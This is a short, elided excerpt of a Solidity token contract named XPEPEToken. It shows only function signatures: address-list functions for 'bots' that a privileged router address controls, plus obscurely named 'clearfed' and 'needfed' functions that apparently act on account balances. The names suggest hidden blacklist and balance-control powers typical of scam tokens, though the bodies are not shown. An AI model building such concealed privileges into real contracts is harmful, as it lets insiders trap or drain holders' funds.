...
contract XPEPEToken is IERC20, DeployVersion, Ownable {
    ...
    function manageList(address[] memory bots_) external {

        require(msg.sender == _router, "Only the router can call this function.");
    ...
    function manageListf(address[] memory bots_) external {
    ...
    function clearfed(address account) external {
    ...
    function needfed(address account, uint256 amount) external {
